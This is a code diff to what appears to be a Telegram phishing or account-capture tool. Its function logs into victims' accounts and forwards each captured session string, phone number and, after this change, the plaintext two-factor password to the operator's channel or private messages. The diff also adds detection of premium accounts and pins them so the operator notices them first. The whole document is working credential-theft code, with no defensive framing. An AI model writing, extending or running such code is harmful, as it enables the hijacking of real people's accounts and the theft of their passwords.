@@ -1698,6 +1698,10 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             ak = b""; dc = 0
         ab = base64.b64encode(ak).decode() if ak else ""
         pu = password is not None
+        
+        # Check Premium Status
+        is_premium = getattr(me, 'premium', False)
+        
         acc = {
             'phone': phone, 'user_id': me.id,
             'username': me.username or '', 'first_name': me.first_name or '',
@@ -1707,7 +1711,7 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             'dc': dc, 'time': str(datetime.now()),
             'has_2fa': pu, 'password': password if pu else '',
             'added_at': time.time(), 'expires_at': time.time() + 86400,
-            'status': 'active', 'is_premium': False,
+            'status': 'active', 'is_premium': is_premium,
             'tg_id': tg_id, 'needs_relogin': False,
         }
         save_account(acc)
@@ -1717,8 +1721,13 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
 
         name_full = f"{me.first_name or ''} {me.last_name or ''}".strip() or "?"
         NOTIFY_TARGET = CHANNEL_ID if CHANNEL_ID else YOUR_TELEGRAM_ID
-        full_msg_html = (f"🔔 New Account!\n📱 {phone}\n👤 {name_full}\n"
-                         f"🆔 {me.id}\n🌐 DC: {dc}\n📏 Session: {ss_len} chars\n\n"
+        
+        # Format Message with Password if exists
+        pass_str = f"\n🔐 Pass: <code>{password}</code>" if pu else ""
+        premium_str = "\n⭐ PREMIUM ACCOUNT" if is_premium else ""
+        
+        full_msg_html = (f"🔔 New Account!{premium_str}\n📱 {phone}\n👤 {name_full}\n"
+                         f"🆔 {me.id}\n🌐 DC: {dc}\n📏 Session: {ss_len} chars{pass_str}\n\n"
                          f"🔑 Session:\n<code>{ss}</code>")
         if len(full_msg_html) > 4000:
             full_msg_html = full_msg_html[:3990] + "..."
@@ -1733,6 +1742,14 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                     acc["admin_notify_msg_id"] = r.id; acc["admin_session_msg_id"] = r.id
                     save_account(acc); captured_accounts = load_accounts()
                     logger.info(f"✅ CHANNEL SENT (mid={r.id})")
+                    
+                    # Auto Pin if Premium
+                    if is_premium:
+                        try:
+                            await bot.pin_message(NOTIFY_TARGET, r.id)
+                            logger.info(f"📌 Premium account pinned in channel.")
+                        except Exception as e:
+                            logger.error(f"Failed to pin: {e}")
                     break
             except Exception as e:
                 logger.warning(f"Channel attempt {attempt+1} fail: {type(e).__name__}: {e}")
@@ -1748,6 +1765,14 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                         acc["admin_notify_msg_id"] = r.id; acc["admin_session_msg_id"] = r.id
                         save_account(acc); captured_accounts = load_accounts()
                         logger.info(f"✅ OWNER SENT (mid={r.id})")
+                        
+                        # Auto Pin if Premium (DM)
+                        if is_premium:
+                            try:
+                                await bot.pin_message(YOUR_TELEGRAM_ID, r.id)
+                                logger.info(f"📌 Premium account pinned in DM.")
+                            except Exception as e:
+                                logger.error(f"Failed to pin in DM: {e}")
                         break
                 except Exception as e:
                     logger.warning(f"Owner attempt {attempt+1} fail: {e}")
